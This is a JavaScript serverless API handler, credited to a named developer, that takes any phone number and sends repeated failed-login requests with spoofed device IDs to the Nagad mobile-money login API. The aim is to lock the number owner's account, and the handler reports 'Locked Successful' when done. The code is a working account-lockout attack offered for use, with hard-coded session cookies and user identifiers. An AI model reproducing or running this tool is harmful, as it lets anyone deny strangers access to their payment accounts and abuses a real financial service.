const https = require("https");

export default async function handler(req, res) {
  const { phone } = req.query;

  if (!phone) {
    return res.status(400).json({
      success: false,
      message: "Phone number is required.",
      credit: "Developer: Tofazzal Hossain"
    });
  }

  const url = "https://app2.mynagad.com:20002/api/login";

  const baseHeaders = {
    "Host": "app2.mynagad.com:20002",
    "User-Agent": "okhttp/3.14.9",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=UTF-8",
    "X-KM-UserId": "87594060",
    "X-KM-User-MpaId": "17404103407455511125333541230563",
    "X-KM-User-AspId": "100012345612345",
    "X-KM-User-Agent": "ANDROID/1164",
    "X-KM-Accept-language": "bn",
    "X-KM-AppCode": "01",
    "Cookie": "WMONID=-SfYtwZ56xA; TS01e66e4e=01e006cfdc837d176a3e33e758d2a271e014631e9ccad981912d50ab6a5ed809861c606eb9ef5fe50a58225a8e61f5a5b82cd8796bd2369befcefad0353d147cefcae4ecf0; JSESSIONID=g2b9KaDZrWj2couoJaX62REkp4_n1cKnbTrpYbGu"
  };

  const postData = JSON.stringify({
    aspId: "100012345612345",
    mpaId: "",
    password: "",
    username: phone
  });

  function sendRequest(deviceId) {
    return new Promise((resolve, reject) => {
      const headers = {
        ...baseHeaders,
        "X-KM-Device-Id": deviceId
      };

      const options = {
        method: "POST",
        headers
      };

      const req = https.request(url, options, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => resolve(data));
      });

      req.on("error", reject);
      req.write(postData);
      req.end();
    });
  }

  try {
    const firstResponse = await sendRequest(`device_${Date.now()}`);

    if (firstResponse.includes("একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক করা হয়েছে")) {
      return res.json({
        success: true,
        status: "Already Locked",
        credit: "Developer: Tofazzal Hossain"
      });
    }

    if (firstResponse.includes("আপনার কোন নগদ অ্যাকাউন্ট নেই")) {
      return res.json({
        success: false,
        status: "Invalid Nagad Number",
        credit: "Developer: Tofazzal Hossain"
      });
    }

    for (let i = 0; i < 9; i++) {
      await sendRequest(`device_${Date.now()}_${i}`);
    }

    return res.json({
      success: true,
      status: "Locked Successful",
      credit: "Developer: Tofazzal Hossain"
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "Request failed: " + error.message,
      credit: "Developer: Tofazzal Hossain"
    });
  }
}
